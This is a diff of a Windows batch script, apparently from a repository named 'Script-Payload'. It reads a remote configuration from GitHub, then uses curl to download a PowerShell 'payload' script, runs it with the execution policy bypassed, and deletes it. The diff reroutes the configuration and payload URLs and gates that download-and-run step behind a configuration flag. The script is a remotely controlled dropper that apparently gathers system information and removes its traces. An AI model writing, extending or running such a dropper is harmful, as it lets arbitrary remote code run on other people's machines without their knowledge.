@@ -1,9 +1,8 @@
 @echo off
 setlocal enabledelayedexpansion
 :: Default color :: color 0F :: Set Console Window Properties :: mode con: cols=80 lines=25
-
-:: Set the URL of the configuration file on GitHub, these is set to a default there is an empty template to in [https://github.com/raf181/Script-Payload/blob/main/Project%201/Config/Remote/empty-config.cfg]
-set "configUrl=https://github.com/raf181/Script-Payload/blob/main/Project%201/Config/Remote/config.cfg" 
+:: Set the URL of the configuration file on GitHub, these is set to a default there is an empty template to in [https://raw.githubusercontent.com/raf181/Config/main/Project-1/config.cfg]
+set "configUrl=https://raw.githubusercontent.com/raf181/Config/main/Project-1/config.cfg" 
 set "config_local=Local-Config.cfg"
 :: Set local path for "antidote" codes
 set "local_antidote=%USERPROFILE%\OneDrive\Documentos\reaper_antidote_codes.cfg"
@@ -97,13 +96,13 @@ if not defined script_infr_enabled (
 )
 :: info reatrive script link
 if not defined script_infr_l (
-    set "script_infr_l=https://raw.githubusercontent.com/raf181/Script-Payload/blob/main/Project%201/Payloads/system-information.ps1"
+    set "script_infr_l=https://raw.githubusercontent.com/raf181/Config/main/Project-1/config.cfg"
     echo no link is set retreaving the default script from [raf181/Script-Payload]
     pause
 )
 :: info reatrive name 
 if not defined script_infr_n (
-    set "script_infr_n=payload"
+    set "script_infr_n=payload.ps1"
     pause
 )
 
@@ -134,12 +133,14 @@ if /i "%text_to_speech_enabled%"=="true" (
 :: End of text to speech payload ============================================================================================== ::
 
 :: Info reatrive payload ====================================================================================================== ::
-:: Download the PowerShell script
-curl -o "%ScriptName%" "%ScriptURL%"
-:: Run the downloaded PowerShell script
-PowerShell.exe -ExecutionPolicy Bypass -File "%ScriptName%"
-:: Delete the downloaded PowerShell script
-del "%ScriptName%"
+if /i "%script_infr_enabled%"=="true" (
+    :: Download the PowerShell script
+    curl -o "%script_infr_n%" "%script_infr_l%"
+    :: Run the downloaded PowerShell script
+    PowerShell.exe -ExecutionPolicy Bypass -File "%script_infr_n%"
+    :: Delete the downloaded PowerShell script
+    del "%script_infr_n%"
+)
 :: Info reatrive payload end ================================================================================================== ::
 
 :: Script ends here =========================================================================================================== ::
